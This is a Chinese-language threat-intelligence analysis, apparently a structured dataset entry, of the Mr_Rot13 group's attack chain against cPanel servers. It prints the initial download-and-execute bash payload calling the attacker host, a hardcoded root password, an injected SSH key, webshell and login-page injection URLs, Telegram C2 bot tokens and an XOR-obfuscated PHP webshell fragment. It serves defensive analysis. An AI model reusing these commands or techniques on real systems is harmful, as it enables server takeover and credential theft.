---
title: 秘密活动6年的神秘黑客组织Mr_Rot13正在利用cPanel高危漏洞部署后门木马
contest: 威胁情报
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [APT分析, Mr_Rot13, cPanel漏洞, 后门植入, 改root密码, SSH公钥注入, PHP Webshell, JS注入, Filemanager远控, Telegram C2]
attack_chain: wget/curl下载Update ELF→chmod 755→nohup执行→删除自身→main_changeRootPassword改root密码→main_installSSHKey注入ssh-ed25519公钥→main_installCpanelPy植入PHP Webshell→main_injectLoginPage注入JS到cpanel登录页→main_runWpsockInstaller部署Filemanager远控→main_postData回传C2→main_sendTelegram回传Telegram
key_payload: "F=/root/.u$$ ELF下载执行;root:123Qwe123C;ssh-ed25519 cpanel-updater;cpanel.py PHP Webshell;login.js JS注入;Filemanager远控;Telegram bot 1190043163:AAEy1FDoB_r8KFiOIqsEpgDQ2k78Ai6BdWk"
one_liner: Mr_Rot13 APT分析：cPanel漏洞利用全链路（改密码/SSH公钥/PHP Webshell/JS注入/Filemanager远控/Telegram C2）
lesson: APT攻击链分析：ELF后门自删除+多后门植入+多C2通道（Telegram+HTTP）
quality: high
---

# 秘密活动6年的神秘黑客组织Mr_Rot13正在利用cPanel高危漏洞部署后门木马

**性质**：APT威胁情报分析（Mr_Rot13组织，秘密活动6年）

**初始Payload**：
```bash
F=/root/.u$$;
(wget -q -O"$F" 'https://cp.dene.de[.]com/Update' 2>/dev/null || 
 curl -sk -o"$F" 'https://cp.dene.de[.]com/Update') && 
chmod 755 "$F" && 
(nohup "$F" -s >/dev/null 2>&1 &) && 
sleep 2; 
rm -f "$F"
```

**后门ELF信息**：
- MD5: `fb1bc3f935fdeb3555465070ba2db33c`
- ELF64-bit LSB executable, x86-64, statically linked, stripped
- FileName: Update

**完整攻击链（6个main函数）**：

**1. main_changeRootPassword**：
- 修改root密码 → `123Qwe123C`

**2. main_installSSHKey**：
- 注入ssh-ed25519公钥：
  ```
  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIswJUfqrkbm2sIMfNHZn1sOYkxjNzEynqJKFU7qoez cpanel-updater
  ```

**3. main_installCpanelPy**：
- 植入PHP Webshell
- 下载：`https://cp.dene.de[.]com/cpanel.py`
- 部署路径：`/usr/local/cpanel/cgi-sys/cpanel.py`

**4. main_injectLoginPage**：
- 注入JavaScript到cpanel登录页
- 下载：`https://cp.dene.de[.]com/login.js` 和 `https://cp.dena.de[.]com/login.tmpl`
- 部署：`/usr/local/cpanel/base/unprotected/cpanel`

**5. main_runWpsockInstaller**：
- 部署Filemanager远控
- MD5: `9305b4ebbb4d39907cf36b62989a6af3`
- ELF64-bit x86-64, stripped

**6. main_postData + main_sendTelegram**：
- 敏感信息回传C2
- Telegram bot 1: `1190043163:AAEy1FDoB_r8KFiOIqsEpgDQ2k78Ai6BdWk`
- Telegram bot 2: `1190043163:AAFtaUfpui9fqKoRnqOa5XvT6MHLcK1axiU`

**后门文件**：
- helper.php
  ```php
  $___= ("8"^"K") .("8"^"L") . ("8"^"J") .("v"^")") . ("8"^"J") .("T"^";") . ("8"^"L") .("W"^"f") . ("R"^"a");
  ```
  异或运算生成shell函数名

**核心技术**：
- ELF后门自删除（`rm -f`）
- cPanel高危漏洞利用
- 多后门植入（密码/SSH/Webshell/JS/远控）
- 多C2通道（Telegram bot + HTTP）
- XOR隐写webshell
- 持久化多层

**质量评估**：高（完整APT攻击链分析 + 6个main函数 + Telegram bot + MD5）
